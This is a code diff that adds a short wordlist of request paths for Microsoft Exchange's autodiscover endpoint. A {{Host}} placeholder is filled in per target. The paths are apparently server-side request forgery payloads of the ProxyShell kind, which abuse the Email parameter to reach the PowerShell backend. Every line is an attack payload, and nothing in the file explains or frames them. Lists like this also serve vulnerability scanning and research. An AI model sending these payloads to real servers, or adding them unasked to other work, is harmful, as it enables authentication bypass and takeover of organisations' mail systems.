@@ -1,0 +1,9 @@
+/autodiscover/autodiscover.json/v1.0/aa@{{Host}}?Protocol=Autodiscoverv1
+/autodiscover/autodiscover.json/v1.0/aa..{{Host}}/owa/?&Email=autodiscover/autodiscover.json?a..{{Host}}&Protocol=Autodiscoverv1&Protocol=Powershell
+/autodiscover/autodiscover.json/v1.0/aa@{{Host}}/owa/?&Email=autodiscover/autodiscover.json?a@{{Host}}&Protocol=Autodiscoverv1&Protocol=Powershell
+/autodiscover/autodiscover.json?aa..{{Host}}/owa/?&Email=autodiscover/autodiscover.json?a..{{Host}}&Protocol=Autodiscoverv1&{{Host}}Protocol=Powershell
+/autodiscover/autodiscover.json?aa@{{Host}}/owa/?&Email=autodiscover/autodiscover.json?a@{{Host}}&Protocol=Autodiscoverv1&{{Host}}Protocol=Powershell
+/autodiscover/autodiscover.json?aa..{{Host}}/owa/?&Email=aa@autodiscover/autodiscover.json?a..{{Host}}&Protocol=Autodiscoverv1&{{Host}}Protocol=Powershell
+/autodiscover/autodiscover.json?aa@{{Host}}/owa/?&Email=aa@autodiscover/autodiscover.json?a@{{Host}}&Protocol=Autodiscoverv1&{{Host}}Protocol=Powershell
+/autodiscover/autodiscover.json/v1.0/aa@autodiscover/autodiscover.json?a..@{{Host}}&Protocol=Autodiscoverv1&Protocol=Powershell
+/autodiscover/autodiscover.json?@{{Host}}/&Email=autodiscover/autodiscover.json%3f@{{Host}}
